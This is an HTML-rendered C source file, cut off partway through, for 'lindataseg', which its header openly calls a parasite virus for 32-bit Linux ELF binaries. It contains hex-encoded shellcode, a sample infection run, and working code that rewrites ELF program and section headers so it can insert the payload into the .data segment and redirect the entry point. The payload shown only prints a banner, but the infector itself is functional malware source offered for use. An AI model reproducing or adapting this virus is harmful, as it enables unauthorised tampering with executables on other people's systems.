<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>lindataseg - lindataseg.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*#########################################################################################################
 * ##############################################
 * ############## www.cyneox.tk #################
 * ##############################################
 * 
 * This is the source code of a very simple parasite virus , who infects data .data segment 
 * of a host file.During this process the section header (SHDR) and the sections offsets will be changed.
 * This source bases on Silvio Cesares code (data_infect.c) and I will like to thank him for writting such 
 * good tutorials and code sources.You'll see a lot of comments in this code and I hope you'll understand 
 * these "lines of letters".
 * 
 * BEST REGARDS TO : Silvio Cesare ( thanks dude for this wonderfull code )
 *                 : Zenok         ( thanks for your moral support ...)
 *                 : $all vxers ,who code good viruses...
 * 
 * That's all folks : xor eax,eax
 *                    inc eax
 *                    int 0x80
 * 
 * mail me : cyneox@cyneox.tk
 * 
 * [code]
 * linux:~# date
 * Mon Apr 12 14:54:35 CEST 2004
 * [/code]
 * ########################################################################################################*/</span><span class="sc0">


</span><span class="sc1">/* how to compile : 
 * [code]
 * linux:~# gcc -o LinDataSeg_Virus LinDataSeg_Virus.c
 * [/code]
 * 
 * example of execution:
 * [code]
 * linux:~# ./prog
 * Your Integer : 1 
 * Your second integer : 2
 *  ---&gt;outputs&lt;---
 *  first integer= 1
 *  second integer= 2
 *  The sum of the integers: 3
 *
 * linux:~# ./LinDataSeg prog
 * PT_LOAD(.data) segment : 
 * &gt; p_vaddr  = 0x8049954
 * &gt; p_filesz = 808
 * &gt; p_memsz  = 840
 * &gt; p_offset = 2388
 * &gt; (new) p_filsz = 909
 * &gt; (new) p_memsz = 941
 * &gt; (new) e_entry = 0x8049c9c
 * &gt; (new) e_shoff = 12277
 * &gt; (new) e_phoff = 52
 *
 * Infecting host file at offset = 3196
 * &gt; host file size : 17161
 * &gt; virus size : 69
 * &gt; bss_len : 32
 *
 * Yeah baby ...time for action ! --&gt; copying virus to host file at offset : 3196
 * &lt;-#-&gt; renaming :      [ done ]
 * &lt;-#-&gt; infection :     [ done ]
 *
 * linux:~# ./prog
 * ---&gt; www.cyneox.tk &lt;---
 * Your Integer : 1
 * Your second integer : 2
 * ---&gt;outputs&lt;---
 * first integer= 1
 * second integer= 2
 * The sum of the integers: 3
 *
 *[/code]
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;elf.h&gt;
</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">errno</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc9">#define ERROR(x) { fprintf(stderr,"__error__("#x") : %s\n",strerror(errno)); exit(EXIT_FAILURE);}
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">prepare_file</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect_me_baby</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc1">/*############################### MAIN ####################################*/</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">off</span><span class="sc10">=</span><span class="sc4">33</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">asm_code</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc6">"\x57"</span><span class="sc0">         </span><span class="sc1">/* push edi */</span><span class="sc0">
        </span><span class="sc6">"\x56"</span><span class="sc0">                  </span><span class="sc1">/* push esi */</span><span class="sc0">
        </span><span class="sc6">"\x50"</span><span class="sc0">                  </span><span class="sc1">/* push eax */</span><span class="sc0">
        </span><span class="sc6">"\x53"</span><span class="sc0">                  </span><span class="sc1">/* push ebx */</span><span class="sc0">
        </span><span class="sc6">"\x51"</span><span class="sc0">                  </span><span class="sc1">/* push ecx */</span><span class="sc0">
        </span><span class="sc6">"\x52"</span><span class="sc0">                  </span><span class="sc1">/* push edx *7*/</span><span class="sc0">
        </span><span class="sc6">"\xeb\x1f"</span><span class="sc0">              </span><span class="sc1">/* jmp msg_jump */</span><span class="sc0">
</span><span class="sc1">/* msg_call:*/</span><span class="sc0">  </span><span class="sc6">"\x59"</span><span class="sc0">                  </span><span class="sc1">/* pop ecx */</span><span class="sc0">
        </span><span class="sc6">"\xb8\x04\x00\x00\x00"</span><span class="sc0">  </span><span class="sc1">/* mov eax,4 */</span><span class="sc0">
        </span><span class="sc6">"\xbb\x01\x00\x00\x00"</span><span class="sc0">  </span><span class="sc1">/* mov ebx,1 */</span><span class="sc0">
        </span><span class="sc6">"\xba\x18\x00\x00\x00"</span><span class="sc0">  </span><span class="sc1">/* mov edx,18 */</span><span class="sc0">
        </span><span class="sc6">"\xcd\x80"</span><span class="sc0">              </span><span class="sc1">/* int 0x80 */</span><span class="sc0">
        </span><span class="sc6">"\x5a"</span><span class="sc0">                  </span><span class="sc1">/* pop edx */</span><span class="sc0">
        </span><span class="sc6">"\x59"</span><span class="sc0">                  </span><span class="sc1">/* pop ecx */</span><span class="sc0">
        </span><span class="sc6">"\x5b"</span><span class="sc0">                  </span><span class="sc1">/* pop ebx */</span><span class="sc0">
        </span><span class="sc6">"\x58"</span><span class="sc0">                  </span><span class="sc1">/* pop eax */</span><span class="sc0">
        </span><span class="sc6">"\x5e"</span><span class="sc0">                  </span><span class="sc1">/* pop esi */</span><span class="sc0">
        </span><span class="sc6">"\x5f"</span><span class="sc0">                  </span><span class="sc1">/* pop edi */</span><span class="sc0">
        </span><span class="sc6">"\xbd\x00\x00\x00\x00"</span><span class="sc0">  </span><span class="sc1">/* mov ebp,0 */</span><span class="sc0">
        </span><span class="sc6">"\xff\xe5"</span><span class="sc0">              </span><span class="sc1">/* jmp ebp 
/* msg_jump:*/</span><span class="sc0">  </span><span class="sc6">"\xe8\xdc\xff\xff\xff"</span><span class="sc0"> </span><span class="sc1">/* call msg_call */</span><span class="sc0">
        </span><span class="sc6">"---&gt; www.cyneox.tk &lt;---\n"</span><span class="sc10">;</span><span class="sc0">
    
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">!=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc6">"usage:%s file_to_infect\n"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">prepare_file</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc11">asm_code</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">asm_code</span><span class="sc10">),</span><span class="sc11">off</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*########################### PREPARE_FILE ###################################*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">prepare_file</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">asm_code</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc10">,*</span><span class="sc11">secdata</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">move</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">vir_offset</span><span class="sc10">,</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc1">/* open host file ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">O_RDWR</span><span class="sc10">))==-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
       
</span><span class="sc1">/* read the ELF header (ehdr)... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* modify virus code so that it knows the correct reentry point after infection... */</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)&amp;</span><span class="sc11">asm_code</span><span class="sc10">[</span><span class="sc11">offset</span><span class="sc10">]=</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc1">/* allocate memory for the prgram header(phdr) table */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">data</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">phdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">))==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* reading the phdr table...*/</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">phdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
    </span><span class="sc11">phdr</span><span class="sc10">=(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">*)</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc1">/* loop through phdr and search for PT_LOAD (.data) */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">!=</span><span class="sc11">PT_DYNAMIC</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">==</span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                         </span><span class="sc1">/* we found the DATA segment */</span><span class="sc0">
                </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"PT_LOAD(.data) segment : \n"</span><span class="sc0">
                       </span><span class="sc6">"&gt; p_vaddr  = 0x%x\n"</span><span class="sc0">               </span><span class="sc1">/* virtual addr pointing to first byte of DATA segment */</span><span class="sc0">
                       </span><span class="sc6">"&gt; p_filesz = %i\n"</span><span class="sc0">               </span><span class="sc1">/* size of DATA segment in file image */</span><span class="sc0">
                       </span><span class="sc6">"&gt; p_memsz  = %i\n"</span><span class="sc0">               </span><span class="sc1">/* size of DATA segment in memory image */</span><span class="sc0">
                       </span><span class="sc6">"&gt; p_offset = %i\n"</span><span class="sc10">,</span><span class="sc0">              </span><span class="sc1">/* file offset of DATA segment pointing to first byte of segment */</span><span class="sc0">
                       </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc10">,</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">,</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">,</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc1">/* now we will set up the offset where the virus must be inserted*/</span><span class="sc0">
                </span><span class="sc1">/* the (new) entry point of host file will be set */</span><span class="sc0">
                </span><span class="sc1">/* we will find out the size of the .bss section */</span><span class="sc0">
                
     </span><span class="sc1">/*------------------------- PHDR of host file  after infection --------------------------*/</span><span class="sc0">
     </span><span class="sc1">/*          --&gt; DATA in the file (file image) &lt;-- 
      *       
      * +Fig.1      0 (beginning of file) 
      *             |----------------| +++++++++++++++++++++++|             
      *             |                |                        |
      *             |----------------| &lt;- : phdr-&gt;p_offset    |+++++ vir_offset(from beginning fo file 
      *             *                *                        |                 to end of phdr-&gt;p_filesz)
      *             * phdr-&gt;p_filesz *                        |
      *             *++++++++++++++++* +++++++++++++++++++++++|
      * 
      * 
      * 
      *        --&gt; Creating the new entry point... &lt;--
      *       
      * +Fig.2                     0 (beginning of file)  
      *                            |---------------|
      *                            |               |
      *                            |---------------| &lt;- : phdr-&gt;p_vaddr
      *                            *               *
      *                            * phdr-&gt;p_memsz *
      *      new entry point : -&gt;  *+++++++++++++++*
      * ---------------------------------------------------------------------------------------*/</span><span class="sc0">
                
                </span><span class="sc11">vir_offset</span><span class="sc10">=</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">+</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc1">/* see Fig.1 */</span><span class="sc0">
                </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc10">=</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">+</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* see Fig.2 */</span><span class="sc0">
                </span><span class="sc11">bss_len</span><span class="sc10">=</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">-</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">         
                
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc1">/* allocate memory for the section headers (SHDR) ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">secdata</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">shdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">))==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* read the fucking shdr's... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">secdata</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">shdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
    
</span><span class="sc1">/* update the fucking shdr's .. */</span><span class="sc0">
    
    </span><span class="sc11">shdr</span><span class="sc10">=(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">*)</span><span class="sc11">secdata</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">&gt;=</span><span class="sc11">vir_offset</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc1">/* len=size of our virus */</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc1">/* the f***** shdr's have been update so they're ready to be written to disk */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">secdata</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">shdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">secdata</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc1">/* update the phdr's ... (to allow virus insertion) */</span><span class="sc0">
        </span><span class="sc11">phdr</span><span class="sc10">=(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">*)</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">!=</span><span class="sc11">PT_DYNAMIC</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">move</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc10">==</span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; (new) p_filsz = %i\n"</span><span class="sc10">,</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; (new) p_memsz = %i\n"</span><span class="sc10">,</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">);</span><span class="sc0">
                
    </span><span class="sc1">/*---------------- THE PHDR AFTER UPDATING ---------------------*/</span><span class="sc0">
    </span><span class="sc1">/* 
     *           --&gt; DATA in the file image &lt;--
     * 
     * +Fig.3     0 (beginning of file)
     *            |---------------------|
     *            |                     | 
     *            |---------------------| &lt;- : phdr-&gt;p_offset  -----|
     *            *                     *                           |
     *            *(old)phdr-&gt;p_filesz  *                           |
     *            *+++++++++++++++++++++*                           |--&gt;(new) phdr-&gt;p_filesz (from phdr-&gt;p_offset 
     *            #                     #                           |                to end of (len+bss_len) )
     *            #   len + bss_len     #                           |
     *            ####################### --------------------------|
     * 
     * 
     *          --&gt; DATA in the memory image &lt;--
     * 
     * +Fig.4     |---------------------|
     *            |                     |
     *            |---------------------| &lt;- : phdr-&gt;p_vaddr -------|
     *            *                     *                           |
     *            * (old)phdr-&gt;p_memsz  *                           |
     *            *+++++++++++++++++++++* &lt;- : ehdr.e_entry         |--&gt;(new) phdr-&gt;p_memsz(from phdr-&gt;p_vaddr to
     *            #                     #                           |                the end of (len+bss_len)
     *            #    len+bss_len      #                           |
     *            ####################### --------------------------|
     * ---------------------------------------------------------------*/</span><span class="sc0">
                
                  </span><span class="sc11">move</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc1">/* update the phdr's to reflect the insertion of the virus... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">phdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc1">/* updating ehdr... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">&gt;=</span><span class="sc11">vir_offset</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">&gt;=</span><span class="sc11">vir_offset</span><span class="sc10">)</span><span class="sc0">
